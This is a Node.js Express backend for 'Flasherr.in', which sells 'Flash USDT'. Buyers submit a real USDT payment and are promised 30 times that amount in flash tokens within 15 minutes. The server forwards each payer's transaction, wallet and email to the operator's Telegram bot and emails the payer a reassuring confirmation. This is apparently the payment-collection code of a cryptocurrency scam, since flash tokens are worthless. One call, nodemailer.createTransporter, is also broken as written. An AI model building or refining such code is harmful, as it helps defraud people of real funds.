const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const axios = require('axios');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Email configuration
const transporter = nodemailer.createTransporter({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    }
});

// Telegram Bot configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Send Telegram notification
async function sendTelegramNotification(transactionData) {
    try {
        const message = `
🚨 NEW TRANSACTION SUBMITTED 🚨

📊 Transaction Details:
• Network: ${transactionData.network}
• Transaction ID: ${transactionData.transaction_id}
• Amount: ${transactionData.amount} USDT
• Flash USDT: ${transactionData.flash_usdt}

👤 User Details:
• Email: ${transactionData.email}
• Wallet Address: ${transactionData.wallet_address}

⏰ Time: ${new Date().toLocaleString()}

🔗 Transaction Hash: ${transactionData.transaction_id}
        `;

        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        
        console.log('Telegram notification sent successfully');
    } catch (error) {
        console.error('Error sending Telegram notification:', error);
    }
}

// Send email to user
async function sendUserEmail(transactionData) {
    try {
        const mailOptions = {
            from: process.env.EMAIL_USER,
            to: transactionData.email,
            subject: 'Transaction Submitted - Flasherr.in',
            html: `
                <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
                    <h2 style="color: #333;">Transaction Submitted Successfully!</h2>
                    
                    <p>Dear Customer,</p>
                    
                    <p>Thank you for your transaction submission. We have received your payment details and will process your Flash USDT transfer within 15 minutes.</p>
                    
                    <div style="background-color: #f5f5f5; padding: 20px; border-radius: 8px; margin: 20px 0;">
                        <h3 style="color: #333; margin-top: 0;">Transaction Details:</h3>
                        <p><strong>Network:</strong> ${transactionData.network}</p>
                        <p><strong>Transaction ID:</strong> ${transactionData.transaction_id}</p>
                        <p><strong>Amount Paid:</strong> ${transactionData.amount} USDT</p>
                        <p><strong>Flash USDT to Receive:</strong> ${transactionData.flash_usdt} Flash USDT</p>
                        <p><strong>Your Wallet:</strong> ${transactionData.wallet_address}</p>
                    </div>
                    
                    <p>Our team will verify your transaction and send the Flash USDT to your wallet address within 15 minutes.</p>
                    
                    <p>If you have any questions, please contact our support team.</p>
                    
                    <hr style="margin: 30px 0;">
                    <p style="color: #666; font-size: 12px;">
                        This is an automated message from Flasherr.in<br>
                        Please do not reply to this email.
                    </p>
                </div>
            `
        };

        await transporter.sendMail(mailOptions);
        console.log('User email sent successfully');
    } catch (error) {
        console.error('Error sending user email:', error);
    }
}

// Calculate Flash USDT amount
function calculateFlashUSDT(usdtAmount) {
    return (parseFloat(usdtAmount) * 30).toFixed(2);
}

// Get network name from transaction type
function getNetworkName(transactionType) {
    const networks = {
        '6': 'BINANCE (BEP20)',
        '7': 'ETH (ERC20)',
        '9': 'TRON (TRC20)',
        '15': 'POL (Polygon)'
    };
    return networks[transactionType] || 'Unknown Network';
}

// Transaction endpoints
app.post('/transaction/:type', async (req, res) => {
    try {
        const { type } = req.params;
        const { transaction_id, wallet_address, amount, email } = req.body;

        // Validate required fields
        if (!transaction_id || !wallet_address || !amount || !email) {
            return res.status(400).json({ 
                success: false, 
                message: 'All fields are required' 
            });
        }

        // Validate amount (minimum 1000 Flash USDT = 33.33 USDT)
        const minUSDT = 33.33;
        if (parseFloat(amount) < minUSDT) {
            return res.status(400).json({ 
                success: false, 
                message: `Minimum amount is ${minUSDT} USDT` 
            });
        }

        const flashUSDT = calculateFlashUSDT(amount);
        const network = getNetworkName(type);

        const transactionData = {
            network,
            transaction_id,
            wallet_address,
            amount,
            flash_usdt: flashUSDT,
            email,
            timestamp: new Date().toISOString()
        };

        // Send notifications
        await Promise.all([
            sendTelegramNotification(transactionData),
            sendUserEmail(transactionData)
        ]);

        res.json({ 
            success: true, 
            message: 'Transaction submitted successfully! Check your email for confirmation.',
            data: transactionData
        });

    } catch (error) {
        console.error('Transaction processing error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Internal server error' 
        });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        timestamp: new Date().toISOString(),
        service: 'Flasherr Backend Server'
    });
});

// Root endpoint
app.get('/', (req, res) => {
    res.json({ 
        message: 'Flasherr Backend Server is running!',
        endpoints: {
            'POST /transaction/:type': 'Submit transaction (types: 6, 7, 9, 15)',
            'GET /health': 'Health check'
        }
    });
});

app.listen(PORT, () => {
    console.log(`🚀 Flasherr Backend Server running on port ${PORT}`);
    console.log(`📧 Email configured: ${process.env.EMAIL_USER ? 'Yes' : 'No'}`);
    console.log(`📱 Telegram configured: ${TELEGRAM_BOT_TOKEN ? 'Yes' : 'No'}`);
});
